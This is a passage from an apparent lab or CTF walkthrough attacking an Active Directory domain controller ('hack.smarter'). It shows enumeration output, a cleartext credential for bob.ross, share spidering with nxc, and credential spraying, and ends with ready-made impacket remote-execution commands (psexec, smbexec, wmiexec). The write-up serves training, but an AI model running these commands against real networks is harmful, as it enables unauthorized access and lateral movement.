+<a id="__codelineno-12-23" name="__codelineno-12-23" href="#__codelineno-12-23"></a><span class="m">1105</span><span class="w">    </span>tyler.ramsey<span class="w">            </span>
+<a id="__codelineno-12-24" name="__codelineno-12-24" href="#__codelineno-12-24"></a>
+<a id="__codelineno-12-25" name="__codelineno-12-25" href="#__codelineno-12-25"></a>ACCESSIBLE<span class="w"> </span>SHARES<span class="w"> </span><span class="o">(</span><span class="m">4</span><span class="o">)</span>
+<a id="__codelineno-12-26" name="__codelineno-12-26" href="#__codelineno-12-26"></a>Share<span class="w">           </span>Access<span class="w">       </span>Comment
+<a id="__codelineno-12-27" name="__codelineno-12-27" href="#__codelineno-12-27"></a>---------------<span class="w"> </span>------------<span class="w"> </span>------------------------------
+<a id="__codelineno-12-28" name="__codelineno-12-28" href="#__codelineno-12-28"></a>IPC$<span class="w">            </span>READ<span class="w">         </span>Remote<span class="w"> </span>IPC
+<a id="__codelineno-12-29" name="__codelineno-12-29" href="#__codelineno-12-29"></a>NETLOGON<span class="w">        </span>READ<span class="w">         </span>Logon<span class="w"> </span>server<span class="w"> </span>share
+<a id="__codelineno-12-30" name="__codelineno-12-30" href="#__codelineno-12-30"></a>Share<span class="w">           </span>READ,WRITE<span class="w">   </span>
+<a id="__codelineno-12-31" name="__codelineno-12-31" href="#__codelineno-12-31"></a>SYSVOL<span class="w">          </span>READ<span class="w">         </span>Logon<span class="w"> </span>server<span class="w"> </span>share
+<a id="__codelineno-12-32" name="__codelineno-12-32" href="#__codelineno-12-32"></a>
+<a id="__codelineno-12-33" name="__codelineno-12-33" href="#__codelineno-12-33"></a>NO<span class="w"> </span>ACCESS<span class="w"> </span><span class="o">(</span><span class="m">2</span><span class="o">)</span>
+<a id="__codelineno-12-34" name="__codelineno-12-34" href="#__codelineno-12-34"></a>Share<span class="w">           </span>Comment
+<a id="__codelineno-12-35" name="__codelineno-12-35" href="#__codelineno-12-35"></a>---------------<span class="w"> </span>------------------------------
+<a id="__codelineno-12-36" name="__codelineno-12-36" href="#__codelineno-12-36"></a>ADMIN$<span class="w">          </span>Remote<span class="w"> </span>Admin
+<a id="__codelineno-12-37" name="__codelineno-12-37" href="#__codelineno-12-37"></a>C$<span class="w">              </span>Default<span class="w"> </span>share
+<a id="__codelineno-12-38" name="__codelineno-12-38" href="#__codelineno-12-38"></a>
+<a id="__codelineno-12-39" name="__codelineno-12-39" href="#__codelineno-12-39"></a>Domain<span class="w"> </span>password<span class="w"> </span>information:
+<a id="__codelineno-12-40" name="__codelineno-12-40" href="#__codelineno-12-40"></a><span class="w">  </span>Password<span class="w"> </span><span class="nb">history</span><span class="w"> </span>length:<span class="w"> </span><span class="m">24</span>
+<a id="__codelineno-12-41" name="__codelineno-12-41" href="#__codelineno-12-41"></a><span class="w">  </span>Minimum<span class="w"> </span>password<span class="w"> </span>length:<span class="w"> </span><span class="m">7</span><span class="w"> </span>←<span class="w"> </span>Weak!
+<a id="__codelineno-12-42" name="__codelineno-12-42" href="#__codelineno-12-42"></a><span class="w">  </span>Minimum<span class="w"> </span>password<span class="w"> </span>age:<span class="w"> </span><span class="m">1</span><span class="w"> </span>day<span class="w"> </span><span class="m">4</span><span class="w"> </span>minutes
+<a id="__codelineno-12-43" name="__codelineno-12-43" href="#__codelineno-12-43"></a><span class="w">  </span>Maximum<span class="w"> </span>password<span class="w"> </span>age:<span class="w"> </span><span class="m">41</span><span class="w"> </span>days<span class="w"> </span><span class="m">23</span><span class="w"> </span>hours<span class="w"> </span><span class="m">53</span><span class="w"> </span>minutes
+<a id="__codelineno-12-44" name="__codelineno-12-44" href="#__codelineno-12-44"></a><span class="w">  </span>Password<span class="w"> </span>properties:
+<a id="__codelineno-12-45" name="__codelineno-12-45" href="#__codelineno-12-45"></a><span class="w">  </span>-<span class="w"> </span>DOMAIN_PASSWORD_COMPLEX:<span class="w"> </span><span class="m">000001</span>
+<a id="__codelineno-12-46" name="__codelineno-12-46" href="#__codelineno-12-46"></a>Domain<span class="w"> </span>lockout<span class="w"> </span>information:
+<a id="__codelineno-12-47" name="__codelineno-12-47" href="#__codelineno-12-47"></a><span class="w">  </span>Lockout<span class="w"> </span>observation<span class="w"> </span>window:<span class="w"> </span><span class="m">30</span><span class="w"> </span>minutes
+<a id="__codelineno-12-48" name="__codelineno-12-48" href="#__codelineno-12-48"></a><span class="w">  </span>Lockout<span class="w"> </span>duration:<span class="w"> </span><span class="m">30</span><span class="w"> </span>minutes
+<a id="__codelineno-12-49" name="__codelineno-12-49" href="#__codelineno-12-49"></a><span class="w">  </span>Lockout<span class="w"> </span>threshold:<span class="w"> </span>None
+<a id="__codelineno-12-50" name="__codelineno-12-50" href="#__codelineno-12-50"></a>
+<a id="__codelineno-12-51" name="__codelineno-12-51" href="#__codelineno-12-51"></a>Extended<span class="w"> </span>Policy<span class="w"> </span>Information<span class="w"> </span><span class="o">(</span>from<span class="w"> </span>verbose<span class="w"> </span>output<span class="o">)</span>:
+<a id="__codelineno-12-52" name="__codelineno-12-52" href="#__codelineno-12-52"></a><span class="w">  </span>Reversible<span class="w"> </span>Encryption:<span class="w"> </span>Disabled
+<a id="__codelineno-12-53" name="__codelineno-12-53" href="#__codelineno-12-53"></a>
+<a id="__codelineno-12-54" name="__codelineno-12-54" href="#__codelineno-12-54"></a><span class="o">[</span>!<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span><span class="m">1</span><span class="w"> </span>account<span class="o">(</span>s<span class="o">)</span><span class="w"> </span>with<span class="w"> </span>PASSWD_NOTREQD<span class="w"> </span>flag:
+<a id="__codelineno-12-55" name="__codelineno-12-55" href="#__codelineno-12-55"></a>
+<a id="__codelineno-12-56" name="__codelineno-12-56" href="#__codelineno-12-56"></a><span class="w">  </span>Enabled<span class="w"> </span>Accounts<span class="w"> </span><span class="o">(</span>HIGH<span class="w"> </span>RISK<span class="o">)</span>:
+<a id="__codelineno-12-57" name="__codelineno-12-57" href="#__codelineno-12-57"></a><span class="w">    </span>Guest
+<a id="__codelineno-12-58" name="__codelineno-12-58" href="#__codelineno-12-58"></a>
+<a id="__codelineno-12-59" name="__codelineno-12-59" href="#__codelineno-12-59"></a><span class="c1"># ------------------------------------------------------------------- # </span>
+<a id="__codelineno-12-60" name="__codelineno-12-60" href="#__codelineno-12-60"></a>
+<a id="__codelineno-12-61" name="__codelineno-12-61" href="#__codelineno-12-61"></a><span class="o">================================================================================</span>
+<a id="__codelineno-12-62" name="__codelineno-12-62" href="#__codelineno-12-62"></a><span class="w">                                </span>COPY-PASTE<span class="w"> </span><span class="nv">LISTS</span><span class="w">                                </span>
+<a id="__codelineno-12-63" name="__codelineno-12-63" href="#__codelineno-12-63"></a><span class="o">================================================================================</span>
+<a id="__codelineno-12-64" name="__codelineno-12-64" href="#__codelineno-12-64"></a>
+<a id="__codelineno-12-65" name="__codelineno-12-65" href="#__codelineno-12-65"></a>Targets<span class="w"> </span><span class="o">(</span>Enumerated<span class="o">)</span><span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="o">)</span>:
+<a id="__codelineno-12-66" name="__codelineno-12-66" href="#__codelineno-12-66"></a>------------------------------
+<a id="__codelineno-12-67" name="__codelineno-12-67" href="#__codelineno-12-67"></a><span class="m">10</span>.0.19.80
+<a id="__codelineno-12-68" name="__codelineno-12-68" href="#__codelineno-12-68"></a>
+<a id="__codelineno-12-69" name="__codelineno-12-69" href="#__codelineno-12-69"></a>Usernames<span class="w"> </span><span class="o">(</span><span class="m">7</span><span class="o">)</span>:
+<a id="__codelineno-12-70" name="__codelineno-12-70" href="#__codelineno-12-70"></a>------------------------------
+<a id="__codelineno-12-71" name="__codelineno-12-71" href="#__codelineno-12-71"></a>administrator
+<a id="__codelineno-12-72" name="__codelineno-12-72" href="#__codelineno-12-72"></a>alice.wonderland
+<a id="__codelineno-12-73" name="__codelineno-12-73" href="#__codelineno-12-73"></a>bob.ross
+<a id="__codelineno-12-74" name="__codelineno-12-74" href="#__codelineno-12-74"></a>dc01$
+<a id="__codelineno-12-75" name="__codelineno-12-75" href="#__codelineno-12-75"></a>guest
+<a id="__codelineno-12-76" name="__codelineno-12-76" href="#__codelineno-12-76"></a>krbtgt
+<a id="__codelineno-12-77" name="__codelineno-12-77" href="#__codelineno-12-77"></a>tyler.ramsey
+<a id="__codelineno-12-78" name="__codelineno-12-78" href="#__codelineno-12-78"></a>
+<a id="__codelineno-12-79" name="__codelineno-12-79" href="#__codelineno-12-79"></a>Usernames<span class="w"> </span><span class="o">(</span>DOMAIN<span class="se">\u</span>ser<span class="o">)</span><span class="w"> </span><span class="o">(</span><span class="m">7</span><span class="o">)</span>:
+<a id="__codelineno-12-80" name="__codelineno-12-80" href="#__codelineno-12-80"></a>------------------------------
+<a id="__codelineno-12-81" name="__codelineno-12-81" href="#__codelineno-12-81"></a>hack.smarter<span class="se">\a</span>dministrator
+<a id="__codelineno-12-82" name="__codelineno-12-82" href="#__codelineno-12-82"></a>hack.smarter<span class="se">\a</span>lice.wonderland
+<a id="__codelineno-12-83" name="__codelineno-12-83" href="#__codelineno-12-83"></a>hack.smarter<span class="se">\b</span>ob.ross
+<a id="__codelineno-12-84" name="__codelineno-12-84" href="#__codelineno-12-84"></a>hack.smarter<span class="se">\d</span>c01$
+<a id="__codelineno-12-85" name="__codelineno-12-85" href="#__codelineno-12-85"></a>hack.smarter<span class="se">\g</span>uest
+<a id="__codelineno-12-86" name="__codelineno-12-86" href="#__codelineno-12-86"></a>hack.smarter<span class="se">\k</span>rbtgt
+<a id="__codelineno-12-87" name="__codelineno-12-87" href="#__codelineno-12-87"></a>hack.smarter<span class="se">\t</span>yler.ramsey
+<a id="__codelineno-12-88" name="__codelineno-12-88" href="#__codelineno-12-88"></a>
+<a id="__codelineno-12-89" name="__codelineno-12-89" href="#__codelineno-12-89"></a>Group<span class="w"> </span>Names<span class="w"> </span><span class="o">(</span><span class="m">21</span><span class="o">)</span>:
+<a id="__codelineno-12-90" name="__codelineno-12-90" href="#__codelineno-12-90"></a>------------------------------
+<a id="__codelineno-12-91" name="__codelineno-12-91" href="#__codelineno-12-91"></a>Allowed<span class="w"> </span>RODC<span class="w"> </span>Password<span class="w"> </span>Replication<span class="w"> </span>Group
+<a id="__codelineno-12-92" name="__codelineno-12-92" href="#__codelineno-12-92"></a>Cert<span class="w"> </span>Publishers
+<a id="__codelineno-12-93" name="__codelineno-12-93" href="#__codelineno-12-93"></a>Cloneable<span class="w"> </span>Domain<span class="w"> </span>Controllers
+<a id="__codelineno-12-94" name="__codelineno-12-94" href="#__codelineno-12-94"></a>Denied<span class="w"> </span>RODC<span class="w"> </span>Password<span class="w"> </span>Replication<span class="w"> </span>Group
+<a id="__codelineno-12-95" name="__codelineno-12-95" href="#__codelineno-12-95"></a>DnsAdmins
+<a id="__codelineno-12-96" name="__codelineno-12-96" href="#__codelineno-12-96"></a>DnsUpdateProxy
+<a id="__codelineno-12-97" name="__codelineno-12-97" href="#__codelineno-12-97"></a>Domain<span class="w"> </span>Admins
+<a id="__codelineno-12-98" name="__codelineno-12-98" href="#__codelineno-12-98"></a>Domain<span class="w"> </span>Computers
+<a id="__codelineno-12-99" name="__codelineno-12-99" href="#__codelineno-12-99"></a>Domain<span class="w"> </span>Controllers
+<a id="__codelineno-12-100" name="__codelineno-12-100" href="#__codelineno-12-100"></a>Domain<span class="w"> </span>Guests
+<a id="__codelineno-12-101" name="__codelineno-12-101" href="#__codelineno-12-101"></a>Domain<span class="w"> </span>Users
+<a id="__codelineno-12-102" name="__codelineno-12-102" href="#__codelineno-12-102"></a>Enterprise<span class="w"> </span>Admins
+<a id="__codelineno-12-103" name="__codelineno-12-103" href="#__codelineno-12-103"></a>Enterprise<span class="w"> </span>Key<span class="w"> </span>Admins
+<a id="__codelineno-12-104" name="__codelineno-12-104" href="#__codelineno-12-104"></a>Enterprise<span class="w"> </span>Read-only<span class="w"> </span>Domain<span class="w"> </span>Controllers
+<a id="__codelineno-12-105" name="__codelineno-12-105" href="#__codelineno-12-105"></a>Group<span class="w"> </span>Policy<span class="w"> </span>Creator<span class="w"> </span>Owners
+<a id="__codelineno-12-106" name="__codelineno-12-106" href="#__codelineno-12-106"></a>Key<span class="w"> </span>Admins
+<a id="__codelineno-12-107" name="__codelineno-12-107" href="#__codelineno-12-107"></a>Protected<span class="w"> </span>Users
+<a id="__codelineno-12-108" name="__codelineno-12-108" href="#__codelineno-12-108"></a>RAS<span class="w"> </span>and<span class="w"> </span>IAS<span class="w"> </span>Servers
+<a id="__codelineno-12-109" name="__codelineno-12-109" href="#__codelineno-12-109"></a>Read-only<span class="w"> </span>Domain<span class="w"> </span>Controllers
+<a id="__codelineno-12-110" name="__codelineno-12-110" href="#__codelineno-12-110"></a>SQLServer2005SQLBrowserUser<span class="nv">$DC01</span>
+<a id="__codelineno-12-111" name="__codelineno-12-111" href="#__codelineno-12-111"></a>Schema<span class="w"> </span>Admins
+<a id="__codelineno-12-112" name="__codelineno-12-112" href="#__codelineno-12-112"></a>
+<a id="__codelineno-12-113" name="__codelineno-12-113" href="#__codelineno-12-113"></a>Share<span class="w"> </span>Names<span class="w"> </span><span class="o">(</span><span class="m">6</span><span class="o">)</span>:
+<a id="__codelineno-12-114" name="__codelineno-12-114" href="#__codelineno-12-114"></a>------------------------------
+<a id="__codelineno-12-115" name="__codelineno-12-115" href="#__codelineno-12-115"></a>ADMIN$
+<a id="__codelineno-12-116" name="__codelineno-12-116" href="#__codelineno-12-116"></a>C$
+<a id="__codelineno-12-117" name="__codelineno-12-117" href="#__codelineno-12-117"></a>IPC$
+<a id="__codelineno-12-118" name="__codelineno-12-118" href="#__codelineno-12-118"></a>NETLOGON
+<a id="__codelineno-12-119" name="__codelineno-12-119" href="#__codelineno-12-119"></a>SYSVOL
+<a id="__codelineno-12-120" name="__codelineno-12-120" href="#__codelineno-12-120"></a>Share
+<a id="__codelineno-12-121" name="__codelineno-12-121" href="#__codelineno-12-121"></a>
+<a id="__codelineno-12-122" name="__codelineno-12-122" href="#__codelineno-12-122"></a>Share<span class="w"> </span>UNC<span class="w"> </span>Paths<span class="w"> </span><span class="o">(</span><span class="m">6</span><span class="o">)</span>:
+<a id="__codelineno-12-123" name="__codelineno-12-123" href="#__codelineno-12-123"></a>------------------------------
+<a id="__codelineno-12-124" name="__codelineno-12-124" href="#__codelineno-12-124"></a><span class="se">\\\\</span><span class="m">10</span>.0.19.80<span class="se">\\</span>ADMIN$
+<a id="__codelineno-12-125" name="__codelineno-12-125" href="#__codelineno-12-125"></a><span class="se">\\\\</span><span class="m">10</span>.0.19.80<span class="se">\\</span>C$
+<a id="__codelineno-12-126" name="__codelineno-12-126" href="#__codelineno-12-126"></a><span class="se">\\\\</span><span class="m">10</span>.0.19.80<span class="se">\\</span>IPC$
+<a id="__codelineno-12-127" name="__codelineno-12-127" href="#__codelineno-12-127"></a><span class="se">\\\\</span><span class="m">10</span>.0.19.80<span class="se">\\</span>NETLOGON
+<a id="__codelineno-12-128" name="__codelineno-12-128" href="#__codelineno-12-128"></a><span class="se">\\\\</span><span class="m">10</span>.0.19.80<span class="se">\\</span>SYSVOL
+<a id="__codelineno-12-129" name="__codelineno-12-129" href="#__codelineno-12-129"></a><span class="se">\\\\</span><span class="m">10</span>.0.19.80<span class="se">\\</span>Share
+<a id="__codelineno-12-130" name="__codelineno-12-130" href="#__codelineno-12-130"></a>
+<a id="__codelineno-12-131" name="__codelineno-12-131" href="#__codelineno-12-131"></a>DC<span class="w"> </span>Hostnames<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="o">)</span>:
+<a id="__codelineno-12-132" name="__codelineno-12-132" href="#__codelineno-12-132"></a>------------------------------
+<a id="__codelineno-12-133" name="__codelineno-12-133" href="#__codelineno-12-133"></a>DC01.hack.smarter
+<a id="__codelineno-12-134" name="__codelineno-12-134" href="#__codelineno-12-134"></a>
+<a id="__codelineno-12-135" name="__codelineno-12-135" href="#__codelineno-12-135"></a>DC<span class="w"> </span>IPs<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="o">)</span>:
+<a id="__codelineno-12-136" name="__codelineno-12-136" href="#__codelineno-12-136"></a>------------------------------
+<a id="__codelineno-12-137" name="__codelineno-12-137" href="#__codelineno-12-137"></a><span class="m">10</span>.0.19.80
+<a id="__codelineno-12-138" name="__codelineno-12-138" href="#__codelineno-12-138"></a>
+<a id="__codelineno-12-139" name="__codelineno-12-139" href="#__codelineno-12-139"></a>Computer<span class="w"> </span>Names<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="o">)</span>:
+<a id="__codelineno-12-140" name="__codelineno-12-140" href="#__codelineno-12-140"></a>------------------------------
+<a id="__codelineno-12-141" name="__codelineno-12-141" href="#__codelineno-12-141"></a>DC01
+<a id="__codelineno-12-142" name="__codelineno-12-142" href="#__codelineno-12-142"></a>
+<a id="__codelineno-12-143" name="__codelineno-12-143" href="#__codelineno-12-143"></a>Server<span class="w"> </span>Names<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="o">)</span>:
+<a id="__codelineno-12-144" name="__codelineno-12-144" href="#__codelineno-12-144"></a>------------------------------
+<a id="__codelineno-12-145" name="__codelineno-12-145" href="#__codelineno-12-145"></a>DC01
+<a id="__codelineno-12-146" name="__codelineno-12-146" href="#__codelineno-12-146"></a>
+<a id="__codelineno-12-147" name="__codelineno-12-147" href="#__codelineno-12-147"></a>PASSWD_NOTREQD<span class="w"> </span>Accounts<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="o">)</span>:
+<a id="__codelineno-12-148" name="__codelineno-12-148" href="#__codelineno-12-148"></a>------------------------------
+<a id="__codelineno-12-149" name="__codelineno-12-149" href="#__codelineno-12-149"></a>guest
+<a id="__codelineno-12-150" name="__codelineno-12-150" href="#__codelineno-12-150"></a>
+<a id="__codelineno-12-151" name="__codelineno-12-151" href="#__codelineno-12-151"></a><span class="nv">AdminCount</span><span class="o">=</span><span class="m">1</span><span class="w"> </span>Accounts<span class="w"> </span><span class="o">(</span><span class="m">3</span><span class="o">)</span>:
+<a id="__codelineno-12-152" name="__codelineno-12-152" href="#__codelineno-12-152"></a>------------------------------
+<a id="__codelineno-12-153" name="__codelineno-12-153" href="#__codelineno-12-153"></a>administrator
+<a id="__codelineno-12-154" name="__codelineno-12-154" href="#__codelineno-12-154"></a>krbtgt
+<a id="__codelineno-12-155" name="__codelineno-12-155" href="#__codelineno-12-155"></a>tyler.ramsey
+<a id="__codelineno-12-156" name="__codelineno-12-156" href="#__codelineno-12-156"></a>
+<a id="__codelineno-12-157" name="__codelineno-12-157" href="#__codelineno-12-157"></a>Network<span class="w"> </span>Interface<span class="w"> </span>IPs<span class="w"> </span><span class="o">(</span><span class="m">2</span><span class="o">)</span>:
+<a id="__codelineno-12-158" name="__codelineno-12-158" href="#__codelineno-12-158"></a>------------------------------
+<a id="__codelineno-12-159" name="__codelineno-12-159" href="#__codelineno-12-159"></a><span class="m">10</span>.0.19.80
+<a id="__codelineno-12-160" name="__codelineno-12-160" href="#__codelineno-12-160"></a>fe80::99db:b3d5:3974:681f
+<a id="__codelineno-12-161" name="__codelineno-12-161" href="#__codelineno-12-161"></a>
+<a id="__codelineno-12-162" name="__codelineno-12-162" href="#__codelineno-12-162"></a>Valid<span class="w"> </span>Credentials<span class="w"> </span><span class="o">(</span>user:password<span class="o">)</span><span class="w"> </span><span class="o">(</span><span class="m">2</span><span class="o">)</span>:
+<a id="__codelineno-12-163" name="__codelineno-12-163" href="#__codelineno-12-163"></a>------------------------------
+<a id="__codelineno-12-164" name="__codelineno-12-164" href="#__codelineno-12-164"></a>NULL<span class="w"> </span>SESSION:<span class="o">(</span>no<span class="w"> </span>secret<span class="o">)</span>
+<a id="__codelineno-12-165" name="__codelineno-12-165" href="#__codelineno-12-165"></a>bob.ross:137Password123!@#
+</code></pre></div>
+<p>Lets spider the shares now that we have more access.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.0.19.80<span class="w"> </span>-u<span class="w"> </span><span class="s1">'bob.ross'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'137Password123!@#'</span><span class="w"> </span>-d<span class="w"> </span><span class="s1">'hack.smarter'</span><span class="w"> </span>-M<span class="w"> </span>spider_plus<span class="w"> </span>-o<span class="w"> </span><span class="nv">OUTPUT_FOLDER</span><span class="o">=</span>.<span class="w"> </span><span class="nv">MAX_FILE_SIZE</span><span class="o">=</span><span class="m">10485760</span><span class="w"> </span><span class="nv">DOWNLOAD_FLAG</span><span class="o">=</span>True
+</code></pre></div>
+<blockquote>
+<p>Nothing of interest was found. Our initial scan had multiple ports open earlier, lets pivot to checking if <code>bob.ross</code> credentials work anywhere else.</p>
+</blockquote>
+<h2 id="rapids-credential-spraying">Rapids Credential Spraying</h2>
+<blockquote>
+<p>[!info] Tool: <a href="https://github.com/Real-Fruit-Snacks/Rapids">Rapids</a></p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>rapids<span class="w"> </span>-t<span class="w"> </span><span class="m">10</span>.0.19.80<span class="w"> </span>-C<span class="w"> </span>known_users<span class="w"> </span>--verify<span class="w"> </span>--commands
+</code></pre></div>
+<blockquote>
+<p>Verify will test the credentials and look for a response, but commands will give us the commands we need to manually test the services.</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="w">                                                                     </span>Valid<span class="w"> </span>Credentials<span class="w">                                                                      </span>
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>┃<span class="w"> </span>Service<span class="w">  </span>┃<span class="w"> </span>Target<span class="w">         </span>┃<span class="w"> </span>Username<span class="w"> </span>┃<span class="w"> </span>Password<span class="w">          </span>┃<span class="w"> </span>Proof<span class="w">                                                                                         </span>┃
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>┡━━━━━━━━━━╇━━━━━━━━━━━━━━━━╇━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>│<span class="w"> </span>kerberos<span class="w"> </span>│<span class="w"> </span><span class="m">10</span>.0.19.80:88<span class="w">  </span>│<span class="w"> </span>bob.ross<span class="w"> </span>│<span class="w"> </span>137Password123!@#<span class="w"> </span>│<span class="w"> </span>TGT<span class="w"> </span>obtained<span class="w"> </span><span class="k">for</span><span class="w"> </span>bob.ross@hack.smarter<span class="w">                                                        </span>│
+<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>│<span class="w"> </span>ldap<span class="w">     </span>│<span class="w"> </span><span class="m">10</span>.0.19.80:389<span class="w"> </span>│<span class="w">          </span>│<span class="w">                   </span>│<span class="w"> </span><span class="nv">namingContexts</span><span class="o">=[</span><span class="s1">'DC=hack,DC=smarter'</span>,<span class="w"> </span><span class="s1">'CN=Configuration,DC=hack,DC=smarter'</span>,<span class="w">                  </span>│
+<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>│<span class="w">          </span>│<span class="w">                </span>│<span class="w">          </span>│<span class="w">                   </span>│<span class="w"> </span><span class="s1">'CN=Schema,CN=Configuration,DC=hack,DC=smarter'</span>,<span class="w"> </span><span class="s1">'DC=DomainDnsZones,DC=hack,DC=smarter'</span>,<span class="w">      </span>│
+<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>│<span class="w">          </span>│<span class="w">                </span>│<span class="w">          </span>│<span class="w">                   </span>│<span class="w"> </span><span class="s1">'DC=ForestDnsZones,DC=hack,DC=smarter'</span><span class="o">]</span><span class="w">                                                       </span>│
+<a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>│<span class="w"> </span>smb<span class="w">      </span>│<span class="w"> </span><span class="m">10</span>.0.19.80:445<span class="w"> </span>│<span class="w">          </span>│<span class="w">                   </span>│<span class="w"> </span>Shares:<span class="w"> </span>ADMIN$,<span class="w"> </span>C$,<span class="w"> </span>IPC$,<span class="w"> </span>NETLOGON,<span class="w"> </span>Share,<span class="w"> </span>SYSVOL<span class="w">                                             </span>│
+<a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>│<span class="w"> </span>wmi<span class="w">      </span>│<span class="w"> </span><span class="m">10</span>.0.19.80:135<span class="w"> </span>│<span class="w">          </span>│<span class="w">                   </span>│<span class="w"> </span>hack.smarter<span class="se">\b</span>ob.ross:137Password123!@#<span class="w">                                                       </span>│
+<a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>└──────────┴────────────────┴──────────┴───────────────────┴───────────────────────────────────────────────────────────────────────────────────────────────┘
+<a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a>
+<a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a><span class="w">  </span><span class="m">1</span><span class="w"> </span>unique<span class="w"> </span>credential<span class="o">(</span>s<span class="o">)</span><span class="w"> </span>across<span class="w"> </span><span class="m">4</span><span class="w"> </span>service<span class="o">(</span>s<span class="o">)</span>.
+<a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a>
+<a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a><span class="w">  </span>Connect<span class="w"> </span>Commands
+<a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a>
+<a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a>
+<a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a><span class="w">  </span><span class="c1"># bob.ross@10.0.19.80 (kerberos, nxc_ldap, nxc_rdp, nxc_smb, nxc_wmi)</span>
+<a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a><span class="w">  </span>impacket-getTGT<span class="w"> </span>hack.smarter/bob.ross:<span class="s1">'137Password123!@#'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.0.19.80
+<a id="__codelineno-15-20" name="__codelineno-15-20" href="#__codelineno-15-20"></a><span class="w">  </span>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://10.0.19.80:389<span class="w"> </span>-D<span class="w"> </span><span class="s1">'bob.ross@hack.smarter'</span><span class="w"> </span>-w<span class="w"> </span><span class="s1">'137Password123!@#'</span><span class="w"> </span>-b<span class="w"> </span><span class="s1">''</span><span class="w"> </span>-s<span class="w"> </span>base<span class="w"> </span>namingContexts
+<a id="__codelineno-15-21" name="__codelineno-15-21" href="#__codelineno-15-21"></a><span class="w">  </span>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://10.0.19.80:389<span class="w"> </span>-D<span class="w"> </span><span class="s1">'bob.ross@hack.smarter'</span><span class="w"> </span>-w<span class="w"> </span><span class="s1">'137Password123!@#'</span><span class="w"> </span>-b<span class="w"> </span><span class="s1">'DC=hack,DC=smarter'</span><span class="w"> </span><span class="s1">'(objectClass=user)'</span><span class="w"> </span>sAMAccountName<span class="w">  </span><span class="c1"># requires domain (base DN)</span>
+<a id="__codelineno-15-22" name="__codelineno-15-22" href="#__codelineno-15-22"></a><span class="w">  </span>xfreerdp<span class="w"> </span>/v:10.0.19.80:3389<span class="w"> </span>/u:bob.ross<span class="w"> </span>/p:<span class="s1">'137Password123!@#'</span><span class="w"> </span>/cert:ignore
+<a id="__codelineno-15-23" name="__codelineno-15-23" href="#__codelineno-15-23"></a><span class="w">  </span>smbclient<span class="w"> </span>-L<span class="w"> </span>//10.0.19.80<span class="w"> </span>-U<span class="w"> </span><span class="s1">'hack.smarter\bob.ross%137Password123!@#'</span>
+<a id="__codelineno-15-24" name="__codelineno-15-24" href="#__codelineno-15-24"></a><span class="w">  </span>impacket-smbexec<span class="w"> </span>hack.smarter/bob.ross:<span class="s1">'137Password123!@#'</span>@10.0.19.80<span class="w">  </span><span class="c1"># requires local admin</span>
+<a id="__codelineno-15-25" name="__codelineno-15-25" href="#__codelineno-15-25"></a><span class="w">  </span>impacket-psexec<span class="w"> </span>hack.smarter/bob.ross:<span class="s1">'137Password123!@#'</span>@10.0.19.80<span class="w">  </span><span class="c1"># requires local admin</span>
+<a id="__codelineno-15-26" name="__codelineno-15-26" href="#__codelineno-15-26"></a><span class="w">  </span>smbclient<span class="w"> </span>//10.0.19.80/C$<span class="w"> </span>-U<span class="w"> </span><span class="s1">'hack.smarter\bob.ross%137Password123!@#'</span><span class="w">  </span><span class="c1"># requires local admin</span>
+<a id="__codelineno-15-27" name="__codelineno-15-27" href="#__codelineno-15-27"></a><span class="w">  </span>impacket-wmiexec<span class="w"> </span>hack.smarter/bob.ross:<span class="s1">'137Password123!@#'</span>@10.0.19.80<span class="w">  </span><span class="c1"># requires local admin</span>
+</code></pre></div>
+<blockquote>
